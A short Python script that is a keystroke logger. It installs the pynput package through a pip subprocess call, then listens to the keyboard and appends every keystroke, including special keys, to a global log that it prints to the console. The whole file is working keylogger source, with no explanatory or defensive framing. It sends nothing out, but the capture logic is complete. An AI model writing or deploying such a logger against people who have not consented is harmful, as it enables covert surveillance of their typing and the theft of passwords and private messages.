
import subprocess

def download():
    subprocess.call(["pip","install","pynput"])
download()
log=""
import pynput.keyboard
def process_key_press(key):
    global log
    try:
        log+=str(key.char)
    except AttributeError:
        if key==key.space:
            log+=" "
        elif key==key.backspace:
            log=log[:-1]
        
        else:
            log=log+" "+str(key)+""
        
    print(log)

keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()